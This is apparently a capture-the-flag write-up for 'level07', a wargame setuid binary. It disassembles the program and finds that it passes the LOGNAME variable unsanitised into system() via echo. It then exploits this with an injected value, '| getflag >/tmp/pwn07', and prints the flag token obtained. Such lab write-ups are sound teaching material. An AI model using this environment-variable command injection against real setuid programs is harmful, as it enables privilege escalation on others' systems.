# level07

- We log as `level07`

- A single file is located inside the home directory of level07:
>`-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07`

- The executable file has setuid & setgid bits permissions

- We can see that the executable will be executed as `flag07` if we execute it being `level07`

- Upon execution without arguments the executable prints:
>`level07`

- We dissassemble it using gdb, here is the asm dump of the main function:
```asm
Dump of assembler code for function main:
   0x08048514 <+0>:     push   %ebp
   0x08048515 <+1>:     mov    %esp,%ebp
   0x08048517 <+3>:     and    $0xfffffff0,%esp
   0x0804851a <+6>:     sub    $0x20,%esp
   0x0804851d <+9>:     call   0x80483f0 <getegid@plt>
   0x08048522 <+14>:    mov    %eax,0x18(%esp)
   0x08048526 <+18>:    call   0x80483e0 <geteuid@plt>
   0x0804852b <+23>:    mov    %eax,0x1c(%esp)
   0x0804852f <+27>:    mov    0x18(%esp),%eax
   0x08048533 <+31>:    mov    %eax,0x8(%esp)
   0x08048537 <+35>:    mov    0x18(%esp),%eax
   0x0804853b <+39>:    mov    %eax,0x4(%esp)
   0x0804853f <+43>:    mov    0x18(%esp),%eax
   0x08048543 <+47>:    mov    %eax,(%esp)
   0x08048546 <+50>:    call   0x8048450 <setresgid@plt>
   0x0804854b <+55>:    mov    0x1c(%esp),%eax
   0x0804854f <+59>:    mov    %eax,0x8(%esp)
   0x08048553 <+63>:    mov    0x1c(%esp),%eax
   0x08048557 <+67>:    mov    %eax,0x4(%esp)
   0x0804855b <+71>:    mov    0x1c(%esp),%eax
   0x0804855f <+75>:    mov    %eax,(%esp)
   0x08048562 <+78>:    call   0x80483d0 <setresuid@plt>
   0x08048567 <+83>:    movl   $0x0,0x14(%esp)
   0x0804856f <+91>:    movl   $0x8048680,(%esp)
   0x08048576 <+98>:    call   0x8048400 <getenv@plt>
   0x0804857b <+103>:   mov    %eax,0x8(%esp)
---Type <return> to continue, or q <return> to quit---
   0x0804857f <+107>:   movl   $0x8048688,0x4(%esp)
   0x08048587 <+115>:   lea    0x14(%esp),%eax
   0x0804858b <+119>:   mov    %eax,(%esp)
   0x0804858e <+122>:   call   0x8048440 <asprintf@plt>
   0x08048593 <+127>:   mov    0x14(%esp),%eax
   0x08048597 <+131>:   mov    %eax,(%esp)
   0x0804859a <+134>:   call   0x8048410 <system@plt>
   0x0804859f <+139>:   leave  
   0x080485a0 <+140>:   ret    
End of assembler dump.
```

- We can see multiple system calls: `getenv`, `asprintf`, `system`
>`0x08048576 <+98>:    call   0x8048400 <getenv@plt>`
>`0x0804858e <+122>:   call   0x8048440 <asprintf@plt>`
>`0x0804859a <+134>:   call   0x8048410 <system@plt>`

- Knowing that the file has setuid bit set the `system` call is interesting, knowing how it works could permit us to execute arbitrary code

- We add a breakpoint at `0x08048576` and display `$0x8048680` which is the element moved as first parameter of `getenv`
>`0x0804856f <+91>:    movl   $0x8048680,(%esp)`
>`(gdb) x/s 0x8048680`
>`0x8048680:       "LOGNAME"`

- We can this the return value of `getenv` is moved at `0x08` which is the third parameter of `asprintf`
>`0x0804857b <+103>:   mov    %eax,0x8(%esp`

- We can this the value of `0x8048688` is moved at `0x04` which is the second parameter of `asprintf`, let's display it:
>`0x0804857f <+107>:   movl   $0x8048688,0x4(%esp)`
>`(gdb) x/s 0x8048688`
>`0x8048688:       "/bin/echo %s "`

- We can see `0x14(%esp)` is moved as first parameter of asprintf, it is a pointer which will be allocated by `asprintf` and this pointer is passed as first parameter of `system`
```asm
   0x08048587 <+115>:   lea    0x14(%esp),%eax
   0x0804858b <+119>:   mov    %eax,(%esp)
   0x0804858e <+122>:   call   0x8048440 <asprintf@plt>
   0x08048593 <+127>:   mov    0x14(%esp),%eax
   0x08048597 <+131>:   mov    %eax,(%esp)
   0x0804859a <+134>:   call   0x8048410 <system@plt>
```

- We can conclude that this binary gets the content of the `LOGNAME` environment variable and pass it through echo.

- We can corrupt the `LOGNAME` variable and make arbitrary code execution:
```bash
export LOGNAME="| getflag >/tmp/pwn07"
./level07
```

- We can `cat /tmp/pwn07`:
>`Check flag.Here is your token : fiumuikeil55xe9cu4dood66h`

- We get the flag: `fiumuikeil55xe9cu4dood66h`